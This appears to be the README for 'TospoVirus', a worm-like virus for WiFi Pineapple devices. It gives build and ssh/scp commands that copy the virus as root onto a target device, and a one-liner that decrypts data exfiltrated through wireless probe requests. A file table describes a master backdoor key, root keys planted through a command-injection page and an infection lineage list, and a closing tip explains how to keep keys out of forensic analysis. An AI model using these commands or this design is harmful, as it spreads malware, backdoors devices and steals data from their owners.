Building TospoVirus for Distribution:
------
./build.sh

Distribute to a working pineapple with version 2.3:
------
ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null root@172.16.42.1 "mkdir /tospo"  
scp -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null dist/tv* root@172.16.42.1:/tospo/  
_Note: You'll need to have a configured device OR use the metasploit-module to enable ssh_

Decrypting ex-filtrated data:
------
printf $(echo "[data copied from wireshark]" | sed -re 's/(..)/\\x\1/g') | openssl rsautl -decrypt -inkey tvd.pem

Files & Purpose:
------
| File         | Purpose  |
| ------------ | -------- |
| tv           |The virus itself.|
| tvbd         |The "master" backdoor key, do not distribute the private key.|
| tvi          |The infection list - carries information about the heritage of this device.|
| tvd          |The disclosure key, used for exfiltrating data via probe requests.|
| tospo_rsa    |The identity private key, specific to each infected device used as the transfer key.|
| tospo_rsa.pub|The identity public key, transferred via the command injection page to allow the private identity to perform actions as root on the remote device.|
| w            |Pushed wireless configuration options, used to restore previous connections.|
| n            |Pushed network configuration options, used to restore previous connections.|
_Note: Files starting with 'tv' are all transferred when infecting a new device. Do not add private keys and the like using names beginning with 'tv' or else your private key will be exposed to forensic analysis._